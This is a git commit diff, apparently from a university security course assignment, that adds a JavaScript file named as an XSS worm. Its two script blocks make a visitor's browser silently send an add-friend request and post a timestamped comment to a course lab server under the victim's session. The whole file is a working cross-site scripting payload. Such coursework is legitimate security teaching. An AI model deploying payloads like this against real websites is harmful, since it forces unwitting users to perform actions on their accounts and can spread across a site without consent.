755e7f4b5df00cc8f71299155578e23f0a4e18d5
mam54 <mam5405@rit.edu>
2021-04-12 17:00:23 -0400

    first draft

---
+++ worm/hw6XXSworm.js
@@ -0,0 +1,13 @@
+<script>
+    var r = new XMLHttpRequest();
+    r.open('POST', 'http://csec380-core.csec.rit.edu:86/add_friend.php?id=130', true);
+    r.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+    r.send();
+</script>
+<script>
+    var d = new Date();
+    var comment =d.getMonth() + "-" + d.getDate() + " at " + d.getHours() + ":" + d.getMinutes() + ":" + d.getSeconds();
+    var x = new XMLHttpRequest();
+    x.open('GET', 'http://csec380-core.csec.rit.edu:86/add_comment.php?id=130&comment='+ comment, true);
+    x.send();
+</script>
